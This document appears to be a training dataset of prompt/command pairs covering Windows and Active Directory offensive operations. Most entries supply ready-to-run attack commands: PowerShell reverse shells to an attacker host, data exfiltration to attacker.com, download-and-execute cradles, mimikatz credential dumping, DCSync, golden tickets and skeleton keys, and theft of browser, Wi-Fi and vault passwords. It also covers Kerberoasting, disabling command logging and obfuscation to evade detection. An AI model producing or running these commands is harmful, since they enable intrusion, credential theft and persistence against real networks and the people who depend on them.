{"input": "If you are sysadmin in some trusted link you can enable xp_cmdshell with:", "output": "Get-SQLServerLinkCrawl -instance \"<INSTANCE1>\" -verbose -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT \"<INSTANCE2>\"'"}
{"input": "If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them. The discovered MSSQL servers must be on the file: C:\\temp\\instances.txt", "output": "Get-SQLInstanceFile -FilePath C:\\temp\\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test"}
{"input": "Allow Remote Desktop connections, Allow RDP connections", "output": "(Get-WmiObject -Class \"Win32_TerminalServiceSetting\" -Namespace root\\cimv2\\terminalservices).SetAllowTsConnections(1)"}
{"input": "Simple PowerShell Reverse Shell, Establishes a basic reverse shell connection to a specified attacker-controlled machine. This allows the attacker to execute commands remotely.", "output": "$client = New-Object System.Net.Sockets.TCPClient('attacker_ip', attacker_port); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()"}
{"input": "Admin users that allow delegation, logged into servers that allow unconstrained delegation", "output": "Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation"}
{"input": "Get name of the principal in the current domain member of the cross-domain group", "output": "ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133"}
{"input": "Groups info", "output": "Get-NetGroup | select samaccountname , admincount , description"}
{"input": "Use Rubeus with the certificate to authenticate as the other user", "output": "Rubeu.exe asktgt /user:CORP\\itadmin /certificate:itadminenrollment.pfx /password:asdf"}
{"input": "perform a Kerberoasting attack, specifically targeting the service account \"websvc\" to retrieve Kerberos tickets that can be cracked offline to obtain plaintext credentials. The command is configured to target a specific user (\"websvc\") using the \"-Identity\" parameter. Without the \"-Identity\" parameter, the cmdlet would kerberoast tickets for all possible users.", "output": "Invoke-Kerberoast [-Identity websvc] #Without \"-Identity\" kerberoast all possible users"}
{"input": "Extracting SSH Keys from User Directories, Searches for RSA private keys in the .ssh directories of all users, which can be used for unauthorized access to SSH servers.", "output": "Get-ChildItem -Path C:\\Users\\*\\.ssh\\id_rsa -Recurse"}
{"input": "Search \"RDPUsers\" users", "output": "Invoke-UserHunter -GroupName \"RDPUsers\""}
{"input": "Get stored Wi-Fi passwords from Wireless Profiles, With this command we can extract all stored Wi-Fi passwords (WEP, WPA PSK, WPA2 PSK etc.) from the wireless profiles that are configured in the Windows system:", "output": "(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize"}
{"input": "psexec into the root domain controller using the golden ticket", "output": "psexec.py < child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10"}
{"input": "An MSI installer package can be easily generated using msfvenom utility from Metasploit Framework. For instance, we can add ourselves into the administrators group:", "output": "msfvenom -p windows/exec CMD='net localgroup administrators joe /add' -f msi > pkg.msi"}
{"input": "Change expiration time of the password", "output": "Set-DomainObject -Identity wkstn-2 -Set @{ \"ms-mcs-admpwdexpirationtime\" = \"232609935231523081\" }"}
{"input": "Enumerating from the network without domain session, Get local MSSQL instance (if any)", "output": "Get-SQLInstanceLocal"}
{"input": "You can use Set-DCShadowPermissions to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive than having DA privileges.", "output": "Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose"}
{"input": "Enumerate all the trusts of all the domains found", "output": "Get-NetForestDomain | Get-NetDomainTrust"}
{"input": "Explanation A certificate authority itself has a set of permissions that secure various CA actions. These permissions can be access from `certsrv.msc`, right clicking a CA, selecting properties, and switching to the Security tab:   This can also be enumerated via PSPKI�s module with `Get-CertificationAuthority | Get-CertificationAuthorityAcl`:", "output": "Get-CertificationAuthority -ComputerName dc.theshire.local | Get-certificationAuthorityAcl | select -expand Access"}
{"input": "Find potentially interesting files, With this command we can identify files with potentially sensitive data such as account information, credentials, configuration files etc. based on their filename:", "output": "gci c:\\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue"}
{"input": "Dumping Credentials from Windows Services, Lists Windows services that are running under a specific user account, which can sometimes include credentials in the service configuration.", "output": "Get-WmiObject win32_service | Where-Object {$_.StartName -like '*@*'} | Select-Object Name, StartName, DisplayName"}
{"input": "MISC Inject Skeleton Key into LSASS process on Domain Controller.", "output": "mimikatz.exe \"privilege::debug\" \"misc::skeleton\""}
{"input": "Enumerating vulnerable users (need domain credentials)", "output": "Get-DomainUser -PreauthNotRequired -verbose"}
{"input": "use icacls.exe to grant read and execute (RX) permissions to the \"Everyone\" group for the specified directory path \"C:\\Users\\redsuit\\Documents\\ssh\\OpenSSH-Win64\" and its subdirectories (/T).", "output": "icacls.exe \"C:\\Users\\redsuit\\Documents\\ssh\\OpenSSH-Win64\" /grant Everyone:RX /T"}
{"input": "Out-Of-Band Data Exfiltration, Exfiltrates data out of the target network using web requests, which can bypass traditional data loss prevention mechanisms.", "output": "$data = Get-Process | ConvertTo-Json; Invoke-RestMethod -Uri 'http://attacker.com/data' -Method Post Body $data"}
{"input": "System Information with WMI.", "output": "Get-WmiObject -ClassName win32_operatingsystem | select * | more"}
{"input": "Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.", "output": "Find-LocalAdminAccess"}
{"input": "Starting the Mozilla Maintenance Service Next, we can replace this file with a malicious `maintenanceservice.exe`, start the maintenance service, and get command execution as SYSTEM.", "output": "sc.exe start MozillaMaintenance"}
{"input": "Register a new PS Session configuration", "output": "Register-PSSessionConfiguration -Name doublehopsess -RunAsCredential domain_name\\username"}
{"input": "Using PowerShell Classes for Code Hiding, Defines a custom PowerShell class to encapsulate and hide malicious code, making it harder for security tools to detect.", "output": "class HiddenCode { [string] Run() { return 'Hidden command executed' } }; $instance = [HiddenCode]::new(); $instance.Run()"}
{"input": "Credentials in SYSVOL and Group Policy Preferences (GPP)", "output": "In corporate Windows Active Directory environments, credentials can be sometimes found stored in the Group Policies, in various custom scripts or configuration files on the domain controllers in the SYSVOL network shares."}
{"input": "Find unquoted service paths, This can lead to privilege escalation in case the executable path also contains spaces and we have write permissions to any of the folders in the path., The following PowerShell command will print out services whose executable path is not enclosed within quotes ('):", "output": "gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq \"Auto\" -and $_.PathName -notlike \"C:\\Windows*\" -and $_.PathName -notlike '\"*'} | select PathName,DisplayName,Name"}
{"input": "Get groups with privileges in other domains inside the forest", "output": "Get-DomainForeignGroupMember"}
{"input": "LDAP With this privilege you can dump the DC database using DCSync:  execute the \"lsadump::dcsync\" command, targeting the Domain Controller \"pcdc.domain.local\" for the \"domain.local\" domain and requesting the retrieval of sensitive information, specifically for the \"krbtgt\" user. This command is commonly used in attacks to extract and dump Kerberos Ticket Granting Ticket (TGT) hashes from Active Directory.", "output": "mimikatz lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt"}
{"input": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.", "output": "Get-RemoteCachedCredential -ComputerName < remotehost> -Verbose"}
{"input": "Listing Running Processes with Details, Lists all currently running processes on the system, sorted by CPU usage, and includes process names, IDs, and CPU time.", "output": "Get-Process | Select-Object -Property ProcessName, Id, CPU | Sort-Object -Property CPU -Descending"}
{"input": "WTS Impersonator Enumerate Local Users on the machine the tool is running from.", "output": ".\\WTSImpersonator.exe -m enum"}
{"input": "Extracting Credentials from IIS Application Pools, Retrieves configuration details of IIS Application Pools, including service accounts, which might contain credentials.", "output": "Import-Module WebAdministration; Get-IISAppPool | Select-Object Name, ProcessModel"}
{"input": "Modifying Token Privileges, Enabling Privileges: Using Enable-NtTokenPrivilege and Disable-NtTokenPrivilege, privileges can be toggled.", "output": "Enable-NtTokenPrivilege"}
{"input": "Find intresting ACEs (Interesting permisions of \"unexpected objects\" (RID>1000 and modify permissions) over other objects", "output": "Find-InterestingDomainAcl -ResolveGUIDs"}
{"input": "Enrollment agent certificate to issue a certificate request on behalf of another user to a template that allow for domain authentication", "output": "Certify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf"}
{"input": "Process Information with WMI.", "output": "Get-WmiObject win32_process | Select Name, Processid"}
{"input": "Set MAC address from command-line, Sometimes it can be useful to set MAC address on a network interface and with PowerShell we can easily do it without using any 3rd party utility:", "output": "Set-NetAdapter -Name \"Ethernet0\" -MacAddress \"00-01-18-57-1B-0D\""}
{"input": "List namespaces inside \"root\\cimv2\" with WMI", "output": "Get-WmiObject -Class \"__Namespace\" -Namespace \"root\\cimv2\" -List -Recurse 2> $null | select __Namespace | sort __Namespace"}
{"input": "Using PowerShell to Interact with the Network Quietly, Establishes a network connection for quiet data transmission, useful for maintaining stealth during data exfiltration or command and control operations.", "output": "$client = New-Object Net.Sockets.TcpClient('attacker_ip', 443); $stream = $client.GetStream(); # Send and receive data"}
{"input": "find and filter information related to processes, threads, files, keys, and process IDs (PIDs) from the output of handle64.exe. The /r option in findstr indicates that the search string is a regular expression, and /i makes the search case-insensitive", "output": "handle64.exe /a | findstr /r /i \"process thread file key pid:\""}
{"input": "Access DB Search keywords in columns trying to access the MSSQL DBs", "output": "Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq \"Accessible\" } | Get-SQLColumnSampleDataThreaded -Keywords \"password\" -SampleSize 5 | select instance , database , column , sample | ft -autosize"}
{"input": "Accessing Event Logs for Anomalies, Searches the Security event log for entries where the entry type is `FailureAudit', which can indicate securityrelated anomalies.", "output": "Get-EventLog -LogName Security | Where-Object {$_.EntryType -eq 'FailureAudit'}"}
{"input": "Enumerates the members of specified local group (default administrators) for all the targeted machines on the current (or specified) domain.", "output": "Invoke-EnumerateLocalAdmin ; Find-DomainLocalGroupMember"}
{"input": "This command can provide information about the current security policies related to user accounts on the Windows system.", "output": "net accounts"}
{"input": "PowerShell's ls (or Get-ChildItem) cmdlet to list the contents of the C$ share on a remote host named \"victim.domain.local.\" This command is attempting to enumerate the files and directories on the C: drive of the specified remote host through the administrative share (C$). It's essential to ensure that you have proper authorization and that such actions comply with security policies when accessing remote systems.", "output": "ls \\\\victim.domain.local\\C$"}
{"input": "\"WTSImpersonator.exe\" to perform a user-hunting operation, targeting a specific user in a given domain, using a list of IP addresses. Additionally, it executes two other executables, \"ExeToExecute.exe\" and \"WTServiceBinary.exe,\" as part of the operation.", "output": ".\\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\\IPsList.txt -c .\\ExeToExecute.exe -sp .\\WTServiceBinary.exe"}
{"input": "Find credentials in Sysprep or Unattend files, This command will look for remnants from automated installation and auto-configuration, which could potentially contain plaintext passwords or base64 encoded passwords:", "output": "gci c:\\ -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue"}
{"input": "Find users with sidHistory set", "output": "Get-NetUser -LDAPFilter '(sidHistory=*)'"}
{"input": "Enumerating from the network without domain session, If you don't have a AD account, you can try to find MSSQL scanning via UDP", "output": "Get-Content c:\\temp\\computers.txt | Get-SQLInstanceScanUDP -Verbose -Threads 10"}
{"input": "HTTP-Based PowerShell Reverse Shell, This script creates a more resilient reverse shell that attempts to reconnect every 10 seconds if the connection is lost. It uses HTTP for communication.", "output": "while($true) { try { $client = New-Object System.Net.Sockets.TCPClient('attacker_ip', attacker_port); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close() } catch { Start-Sleep -Seconds 10 } }"}
{"input": "Leverage Mimikatz to perform a DCSync attack, specifically targeting the KRBTGT account in the \"dcorp\" domain to extract sensitive credential information from Active Directory.", "output": "Invoke-Mimikatz -Command '\"lsadump::dcsync /user:dcorp\\krbtgt\"'"}
{"input": "Enumerating from inside the domain.This looks for SPNs that starts with MSSQL.Test connections with each one", "output": "Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose"}
{"input": "Get permissions of a file", "output": "Get-PathAcl -Path \"\\\\dc.mydomain.local\\sysvol\""}
{"input": "Dynamic Invocation with Reflection, Uses reflection to dynamically invoke system management functions, allowing for more stealthy execution of commands.", "output": "$assembly = [Reflection.Assembly]::LoadWithPartialName('System.Management'); $type = $assembly.GetType('System.Management.ManagementObjectSearcher'); $constructor = $type.GetConstructor(@([string])); $instance = $constructor.Invoke(@('SELECT * FROM Win32_Process')); $method = $type.GetMethod('Get'); $result = $method.Invoke($instance, @())"}
{"input": "Set the owner of 'dfm' in the current domain to 'harmj0y'", "output": "Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y"}
{"input": "With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:", "output": "Set-PSReadlineOption -HistorySaveStyle SaveNothing"}
{"input": "Full way impersonating the user, Get a TGT of the user with cross-domain permissions", "output": "Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap"}
{"input": "Command Aliasing, Creates an alias for a PowerShell command to disguise its true purpose, which can be useful in evading script analysis.", "output": "$alias = 'Get-Dir'; Set-Alias -Name $alias -Value Get-ChildItem; Invoke-Expression $alias"}
{"input": "Get stored passwords from Windows PasswordVault, Using the following PowerShell command we can extract secrets from the Windows PasswordVault, which is a Windows built-in mechanism for storing passwords and web credentials e.g. for Internet Explorer, Edge and other applications:", "output": "[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }"}
{"input": "Using Get-NtTokenPrivilege, This command lists the privileges of a token, showing their names, LUIDs, and whether they are enabled or disabled. This is useful for assessing the capabilities of a user or process.", "output": "Get-NtTokenPrivilege $token"}
{"input": "Find computers with Constrained Delegation", "output": "Get-NetComputer -TrustedToAuth | select samaccountname"}
{"input": "Get Kerberoastable users", "output": "setspn.exe -Q */* ; Get-NetUser -SPN | select serviceprincipalname"}
{"input": "Groups that contain users outside of its domain and return its members", "output": "Get-DomainForeignGroupMember -Domain domain.external"}
{"input": "Get users with reversible encryption (PWD in clear text with dcsync)", "output": "Get-DomainUser -Identity * | ? { $_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*' } | select samaccountname , useraccountcontrol"}
{"input": "File-less download and execute, Using this tiny PowerShell command we can easily download and execute arbitrary PowerShell code that is hosted remotely ' either on our own machine or on the Internet - The remote content will be downloaded and loaded without touching the disk (file-less):", "output": "iex(iwr(\"https://URL\"));iwr = Invoke-WebRequest;iex = Invoke-Expression"}
{"input": "Extract all local Master Keys with Administrator If you are administrator you can obtain the dpapi master keys using sekurlsa. This module allows Mimikatz to perform various actions related to DPAPI, such as extracting DPAPI master keys, decrypting DPAPI-protected data, and interacting with DPAPI-related functionality in the Windows operating system", "output": "sekurlsa::dpapi"}
{"input": "Enumerating Domain Users, Retrieves a list of all domain users, including their names, account status, and last logon dates.", "output": "Get-ADUser -Filter * -Properties * | Select-Object -Property Name, Enabled, LastLogonDate"}
{"input": "Dump passwords from Google Chrome browser, The following command extracts stored credentials from the Google Chrome browser, if is installed and if there are any passwords stored:", "output": "[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))"}
{"input": "Get users with privileges in other domains inside the forest", "output": "Get-DomainForeingUser"}
{"input": "Executing Remote Commands, Executes a command remotely on a target PC, in this case, listing processes. Requires credentials for the target system.", "output": "Invoke-Command -ComputerName TargetPC -ScriptBlock { Get-Process } -Credential (Get-Credential)"}
{"input": "Environment Variable Obfuscation, Stores a command in an environment variable and then executes it, which can help hide the command from casual observation and some security tools.", "output": "$env:PSVariable = 'Get-Process'; Invoke-Expression $env:PSVariable"}
{"input": "Direct bypass: uninstall a .NET assembly (psby.exe) using the InstallUtil.exe tool with logging to console enabled.", "output": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=true /U c:\\temp\\psby.exe"}
{"input": "Reading Credentials from Configuration Files, Searches for strings containing `password=' in all .config files on the C: drive, which can reveal hardcoded credentials.", "output": "Get-ChildItem -Path C:\\ -Include *.config -Recurse | Select-String -Pattern 'password='"}
{"input": "Find interesting files, can use filters", "output": "Find-InterestingDomainShareFile"}
{"input": "Get members of the cros-domain group", "output": "Get-DomainGroupMember -Identity \"External Admins\" | select MemberName"}
{"input": "Transform SID to name", "output": "ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126"}
{"input": "COnvert GPO GUID to name", "output": "Get-GPO -Guid 18E5A689-E67F-90B2-1953-198ED4A7F532"}
{"input": "Search registry for auto-logon credentials, Windows systems can be configured to auto login upon boot, which is for example used on POS (point of sale) systems. Typically, this is configured by storing the username and password in a specific Winlogon registry location, in clear text.The following command will get the auto-login credentials from the registry:", "output": "gp 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon' | select \"Default*\""}
{"input": "Check current logon session as administrator using logonsessions from sysinternals", "output": "logonsessions.exe"}
{"input": "Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use /patch for a subset of data, use /inject for everything. Inject LSASS to extract credentials.", "output": "mimikatz lsadump::lsa /inject exit"}
{"input": "Disable PowerShell command logging, The PowerShell history file is a plaintext file located in each users' profile in the following location:", "output": "C:\\Users\\<USERNAME>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt"}
{"input": "Get last user logged on (needs admin rigths in host)", "output": "Get-LastLoggedon -ComputerName < servername>"}
{"input": "Add user to 'Domain Admins'", "output": "Add-NetGroupUser -Username username -GroupName 'Domain Admins' -Domain my.domain.local"}
{"input": "Get specific info of current domain controller", "output": "Get-DomainController | select Forest , Domain , IPAddress , Name , OSVersion | fl"}
{"input": "Rubeus.exe to generate and display the Kerberos Ticket Granting Ticket (TGT) hash for a specified computer account (\"FAKECOMPUTER$\") with the password \"123456\" in the \"domain.local\" domain. This operation is commonly performed in Kerberos ticket forging or password spraying attacks for lateral movement or privilege escalation.", "output": ".\\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local"}
{"input": "Extracting System Secrets with Mimikatz, Uses Mimikatz to extract logon passwords and other sensitive data from system memory.", "output": "Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"' | Out-File -FilePath C:\\temp\\logonpasswords.txt"}
{"input": "Generate a Golden Ticket for Kerberos authentication. The intent of this command is to create a malicious Kerberos ticket for the user \"LukeSkywalker\" with specific parameters, including the user ID, domain, security identifier (SID), target server, RC4 encryption key, and service type (in this case, \"cifs\" or Common Internet File System). After executing the Mimikatz command, the \"exit\" statement is used, potentially to exit the Mimikatz tool.", "output": "mimikatz \"kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt\" exit"}
{"input": "Check if AlwaysInstallElevated is enabled, If the following AlwaysInstallElevated registry keys are set to 1, it means that any low privileged user can install *.msi files with NT AUTHORITY\\SYSTEM privileges. Here's how to check it with PowerShell:", "output": "gp 'HKCU:\\Software\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated;gp 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\Installer' -Name AlwaysInstallElevated"}
{"input": "Obtain a shell", "output": "Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell \"powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1'')\"'"}
{"input": "Check for LSASS WDigest caching, if it is disabled, we can still enable it using the following command, but we will also have to restart the system afterwards:", "output": "sp registry::HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\Wdigest -name UseLogonCredential -value 1"}
{"input": "Try to connect and obtain info from each MSSQL server (also useful to check conectivity)", "output": "Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose"}
{"input": "Base64 Encoding for Command Obfuscation, Encodes a PowerShell command in Base64 to obfuscate it, making it less detectable by security tools.", "output": "$command = 'Get-Process'; $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command)); powershell.exe EncodedCommand $encodedCommand"}
{"input": "Get special rights over All administrators in domain", "output": "Get-NetGroupMember -GroupName \"Administrators\" -Recurse | ? { $_.IsGroup -match \"false\" } | % { Get-ObjectACL -SamAccountName $_.MemberName -ResolveGUIDs } | select ObjectDN , IdentityReference , ActiveDirectoryRights"}
{"input": "Execute code in the victim system using WMI", "output": "Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist \"$RunCommand\""}
{"input": "Taking Ownership of the File After running the PowerShell script, we should have full control of this file and can take ownership of it.", "output": "takeown /F C:\\Program Files (x86)\\Mozilla Maintenance Service\\maintenanceservice.exe"}
{"input": "Enumerate permissions for GPOs where users with RIDs of > 1000 have some kind of modification/control rights", "output": "Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ( $_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\\d{3,}$' ) -and ( $_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner' ) } | select ObjectDN , ActiveDirectoryRights , SecurityIdentifier | fl"}
{"input": "Variable Name Obfuscation, Obfuscates a command by splitting it into parts and reassembling it, making the command less recognizable to security tools.", "output": "$o = 'Get'; $b = 'Process'; $cmd = $o + '-' + $b; Invoke-Expression $cmd"}
{"input": "Returns all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences.", "output": "Get-DomainGPOLocalGroup | select GPODisplayName , GroupName , GPOType"}
{"input": "Lets list groups members of the domain and its members", "output": "Get-NetLocalGroupMember -ComputerName dc.domain.External"}
{"input": "Registry Key Usage for Persistence, Uses the Windows Registry to store and later execute encoded payloads, aiding in persistence and evasion.", "output": "$path = 'HKCU:\\Software\\MyApp'; New-Item -Path $path -Force; New-ItemProperty -Path $path -Name 'Config' -Value 'EncodedPayload' -PropertyType String -Force; $regValue = Get-ItemProperty -Path $path -Name 'Config'; Invoke-Expression $regValue.Config"}
{"input": "Through Certify, enumerate Enterprise CAs", "output": "certutil.exe -TCAInfo"}
{"input": "If you are already inside the Windows machine you can force Windows to connect to a server using privileged accounts with Defender MpCmdRun", "output": "C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2010.7-0\\MpCmdRun.exe -Scan -ScanType 3 -File \\\\<YOUR IP>\\file.txt"}
{"input": "Get AdminSDHolders", "output": "Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=EGOTISTICAL-BANK,DC=local' | % { $_.SecurityIdentifier } | Convert-SidToName"}
{"input": "Through Certify, enumerate vulnerable certificate templater", "output": "Certify.exe find /vulnerable"}
{"input": "Execution Policy Bypass", "output": "powershell -ep bypass"}
{"input": "Users Filters, All enabled users", "output": "Get-NetUser -UACFilter NOT_ACCOUNTDISABLE -properties distinguishedname"}
{"input": "using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.", "output": "Get-RemoteLocalAccountHash -ComputerName < remotehost> -Verbose"}
{"input": "Get-DomainObject cmdlet to retrieve information about the machine account quota for the domain specified as \"domain.local.\" The command fetches the machine account quota attribute for the domain \"dc=domain,dc=local\" and then selects and displays the \"MachineAccountQuota\" property. This information is related to the limit on the number of computer objects (machine accounts) that can be created in the specified domain.", "output": "Get-DomainObject -Identity \"dc=domain,dc=local\" -Domain domain.local | select MachineAccountQuota"}
{"input": "Convert SID to Name", "output": "S-1-5-21-1874506631-3219952063-538504511-2136 | Convert-SidToName"}
{"input": "use GetUserSPNs.py to request Service Principal Names (SPNs) without preauthentication for a list of users specified in the \"LIST_USERS\" file, targeting the domain controller \"dc.domain.local\" in the \"domain.local\" domain, and utilizing the \"NO_PREAUTH_USER\" as a user with no preauthentication.", "output": "GetUserSPNs.py -no-preauth \"NO_PREAUTH_USER\" -usersfile \"LIST_USERS\" -dc-host \"dc.domain.local\" \"domain.local\"/"}
{"input": "Execution of a payload using a tool called \"jp.exe\" with the intent of running PowerShell code from a remote source. .\\jp.exe: Executes the \"jp.exe\" program or script. -l 1337: Specifies the listening port (1337 in this case). -c \"{4991d34b-80a1-4291-83b6-3328366b9097}\": Specifies a unique identifier or command channel. It could be used for communication or identification purposes. -p c:\\windows\\system32\\cmd.exe: Specifies the program to execute, which is the Windows Command Prompt (\"cmd.exe\"). -a \"/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')\": Specifies the arguments to be passed to the executed program. In this case, it runs a PowerShell command that downloads and executes a PowerShell script from a remote location (\"http://10.10.14.3:8080/ipst.ps1\"). -t : Specifies the target. In this case, the asterisk () may indicate that the payload is intended to target all available systems.", "output": ".\\jp.exe -l 1337 -c \"{4991d34b-80a1-4291-83b6-3328366b9097}\" -p c:\\windows\\system32\\cmd.exe -a \"/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')\" -t *"}
{"input": "Persistence Force preauth not required for a user where you have GenericAll permissions (or permissions to write properties):", "output": "Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose"}
{"input": "Utilizing PowerShell Runspaces for Evasion, Executes PowerShell commands within a separate runspace, isolating them from the main PowerShell environment and evading some forms of detection.", "output": "$runspace = [runspacefactory]::CreateRunspace(); $runspace.Open(); $pipeline = $runspace.CreatePipeline(); $pipeline.Commands.AddScript('Get-Process'); $results = $pipeline.Invoke(); $runspace.Close(); $results"}
{"input": "Extracting Network Configuration, This command gathers network configuration details such as interface aliases, IPv4 and IPv6 addresses, and DNS server information.", "output": "Get-NetIPConfiguration | Select-Object -Property InterfaceAlias, IPv4Address, IPv6Address, DNServer"}
{"input": "Key Privileges, Allows bypassing traverse checking.", "output": "SeChangeNotifyPrivilege"}
{"input": "Set-DomainObject cmdlet to modify the service principal name (SPN) attribute for a specified user (<username>) in a Windows domain. The command is attempting to set the SPN to \"fake/NOTHING\". SPNs are used in Kerberos authentication and are associated with services running on servers. Modifying SPNs can have implications for authentication and authorization in a Windows domain, so it's important to ensure that such changes are made with proper authorization and understanding of the potential impact.", "output": "Set-DomainObject -Identity <username> -Set @{serviceprincipalname=\"fake/NOTHING\"}r"}
{"input": "List RDP sessions inside a host (needs admin rights in host)", "output": "Get-NetRDPSession -ComputerName < servername>"}
{"input": "Here's a quick one-liner for checking whether we are running elevated PowerShell session with Administrator privileges:", "output": "If (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] \"Administrator\")) { echo \"yes\"; } else { echo \"no\"; }"}
{"input": "List all usernames", "output": "Get-NetUser | select samaccountname , description , pwdlastset , logoncount , badpwdcount"}
{"input": "Using the Get-WinEvent cmdlet to query the Security log for events with Event ID 4769. The command filters the events based on various conditions in the event message. Specifically, it filters out events where the service account is 'krbtgt,' the account name ends with '$', the account name does not contain '$@', the failure status is '0x0,' and the substatus is '0x17'.", "output": "Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split(\"`n\")[8] -ne 'krbtgt' -and $_.Message.split(\"`n\")[8] -ne '*$' -and $_.Message.split(\"`n\")[3] -notlike '*$@*' -and $_.Message.split(\"`n\")[18] -like '*0x0*' -and $_.Message.split(\"`n\")[17] -like \"*0x17*\"} | select ExpandProperty message"}
{"input": "perform Kerberoasting against the specified domain controller (\"dc.domain.local\") for the \"domain.local\" domain. It uses a user with no preauthentication (\"NO_PREAUTH_USER\") and targets a specific service principal name (\"TARGET_SERVICE\"), with the results saved to an output file named \"kerberoastables.txt\".", "output": "Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:\"domain.local\" /dc:\"dc.domain.local\" /nopreauth:\"NO_PREAUTH_USER\" /spn:\"TARGET_SERVICE\""}
